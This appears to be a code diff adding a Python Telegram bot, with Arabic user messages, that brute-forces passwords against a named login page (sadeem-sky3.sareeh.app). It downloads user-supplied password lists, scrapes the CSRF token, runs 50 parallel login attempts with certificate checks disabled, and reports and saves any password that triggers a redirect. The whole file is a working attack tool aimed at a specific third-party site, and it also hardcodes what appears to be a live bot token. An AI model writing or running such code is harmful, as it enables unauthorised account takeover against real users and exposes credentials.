@@ -1,0 +1,237 @@
+import asyncio
+import logging
+import requests
+from bs4 import BeautifulSoup
+import time
+import urllib3
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import threading
+import os
+
+from aiogram import Bot, Dispatcher, types, F
+from aiogram.filters import Command
+from aiogram.enums import ParseMode
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# ===== إعدادات البوت =====
+BOT_TOKEN = "8699135657:AAH3OFqYR_Ll4RDG12WiEwS3rVV3VpATQGA"
+
+# ===== متغيرات عامة =====
+found_password = None
+found_lock = threading.Lock()
+token = None
+url = "https://sadeem-sky3.sareeh.app/index.php/login"
+attack_running = False
+
+logging.basicConfig(level=logging.INFO)
+bot = Bot(token=BOT_TOKEN)
+dp = Dispatcher()
+
+def get_token():
+    global token
+    try:
+        s = requests.Session()
+        resp = s.get(url, verify=False, timeout=5)
+        soup = BeautifulSoup(resp.text, 'html.parser')
+        token_input = soup.find('input', {'name': '_token'}) or soup.find('input', {'name': 'csrf_token'})
+        if token_input:
+            token = token_input.get('value')
+            return token
+    except Exception as e:
+        logging.error(f"Error getting token: {e}")
+    return None
+
+def try_login(pwd, username):
+    global found_password, token
+    
+    if found_password:
+        return None
+    
+    session = requests.Session()
+    session.headers.update({
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Origin': 'https://sadeem-sky3.sareeh.app',
+        'Referer': url,
+        'Connection': 'keep-alive',
+    })
+    
+    payload = {'username': username, 'password': pwd}
+    if token:
+        payload['_token'] = token
+    
+    try:
+        response = session.post(url, data=payload, verify=False, timeout=2, allow_redirects=False)
+        
+        if response.status_code == 302:
+            with found_lock:
+                if not found_password:
+                    found_password = pwd
+                    with open("found_password.txt", "w") as f:
+                        f.write(pwd)
+            return pwd
+        return None
+    except:
+        return None
+
+# ===== أوامر البوت =====
+
+@dp.message(Command("start"))
+async def cmd_start(message: types.Message):
+    await message.answer(
+        "👋 أهلاً بك في بوت التخمين!\n\n"
+        "📋 الأوامر المتاحة:\n\n"
+        "1️⃣ أرسل ملف الباسوردات (.txt) مع كتابة اسم المستخدم في الكابشن\n"
+        "2️⃣ ارسل /crack لبدء العملية\n\n"
+        "⚡ أو استخدم:\n"
+        "/attack username - بعد ما ترسل الملف"
+    )
+
+@dp.message(F.document)
+async def handle_document(message: types.Message):
+    global attack_running
+    
+    if attack_running:
+        await message.answer("⏳ في عملية تخمين شغالة حالياً! انتظر أو ارسل /stop")
+        return
+    
+    # التحقق من نوع الملف
+    if not message.document.file_name.endswith('.txt'):
+        await message.answer("❌ الملف لازم يكون .txt")
+        return
+    
+    # تحميل الملف
+    file = await bot.get_file(message.document.file_id)
+    file_path = f"passwords_{message.from_user.id}.txt"
+    
+    await bot.download_file(file.file_path, file_path)
+    
+    # حفظ اليوزر
+    username = message.caption or "user"
+    with open(f"user_{message.from_user.id}.txt", "w") as f:
+        f.write(username)
+    
+    # عد الأسطر
+    with open(file_path, 'r', encoding='utf-8') as f:
+        lines = len([l for l in f if l.strip()])
+    
+    await message.answer(
+        f"✅ تم استلام الملف!\n\n"
+        f"👤 اسم المستخدم: `{username}`\n"
+        f"📁 عدد الباسوردات: {lines}\n\n"
+        f"ارسل /crack عشان تبدأ العملية",
+        parse_mode=ParseMode.MARKDOWN
+    )
+
+@dp.message(Command("crack"))
+async def cmd_crack(message: types.Message):
+    global found_password, token, attack_running
+    
+    user_id = message.from_user.id
+    user_file = f"user_{user_id}.txt"
+    pass_file = f"passwords_{user_id}.txt"
+    
+    if not os.path.exists(user_file) or not os.path.exists(pass_file):
+        await message.answer("❌ ما عندك ملفات! أرسل ملف الباسوردات أولاً مع اليوزر في الكابشن")
+        return
+    
+    if attack_running:
+        await message.answer("⏳ في عملية شغالة! انتظر...")
+        return
+    
+    # قراءة البيانات
+    with open(user_file, "r") as f:
+        username = f.read().strip()
+    
+    with open(pass_file, 'r', encoding='utf-8') as f:
+        passwords = [line.strip() for line in f if line.strip()]
+    
+    if not passwords:
+        await message.answer("❌ الملف فاضي!")
+        return
+    
+    found_password = None
+    attack_running = True
+    
+    msg = await message.answer(
+        f"🔐 بدء التخمين...\n\n"
+        f"👤 يوزر: `{username}`\n"
+        f"🔑 باسوردات: {len(passwords)}\n"
+        f"⏳ جاري جلب التوكن...",
+        parse_mode=ParseMode.MARKDOWN
+    )
+    
+    # جلب التوكن
+    token = get_token()
+    
+    await msg.edit_text(
+        f"🔐 جاري التخمين...\n\n"
+        f"👤 يوزر: `{username}`\n"
+        f"🔑 باسوردات: {len(passwords)}\n"
+        f"🧵 خيوط: 50\n"
+        f"⏳ الحالة: جاري...",
+        parse_mode=ParseMode.MARKDOWN
+    )
+    
+    start_time = time.time()
+    
+    # تشغيل التخمين في thread منفصل
+    def run_attack():
+        global found_password
+        with ThreadPoolExecutor(max_workers=50) as executor:
+            futures = {executor.submit(try_login, pwd, username): pwd for pwd in passwords}
+            
+            for future in as_completed(futures):
+                if found_password:
+                    executor.shutdown(wait=False, cancel_futures=True)
+                    break
+    
+    loop = asyncio.get_event_loop()
+    await loop.run_in_executor(None, run_attack)
+    
+    elapsed = time.time() - start_time
+    attack_running = False
+    
+    if found_password:
+        await msg.edit_text(
+            f"✅ **تم العثور على الباسورد!**\n\n"
+            f"👤 يوزر: `{username}`\n"
+            f"🔓 باسورد: `{found_password}`\n"
+            f"⏱️ الوقت: {elapsed:.1f} ثانية",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        
+        # حفظ في الملف
+        with open("found_password.txt", "w") as f:
+            f.write(f"User: {username}\nPass: {found_password}")
+            
+    else:
+        await msg.edit_text(
+            f"❌ **ما لقينا الباسورد**\n\n"
+            f"👤 يوزر: `{username}`\n"
+            f"🔑 جربنا: {len(passwords)} باسورد\n"
+            f"⏱️ الوقت: {elapsed:.1f} ثانية",
+            parse_mode=ParseMode.MARKDOWN
+        )
+
+@dp.message(Command("stop"))
+async def cmd_stop(message: types.Message):
+    global attack_running
+    attack_running = False
+    await message.answer("🛑 تم إيقاف العملية")
+
+@dp.message(Command("attack"))
+async def cmd_attack(message: types.Message):
+    await message.answer(
+        "📋 طريقة الاستخدام:\n\n"
+        "1. أرسل ملف الباسوردات (.txt)\n"
+        "2. اكتب اسم المستخدم في كابشن الملف\n"
+        "3. ارسل /crack\n\n"
+        "⚡ البوت جاهز!"
+    )
+
+async def main():
+    await dp.start_polling(bot)
+
+if __name__ == "__main__":
+    asyncio.run(main())
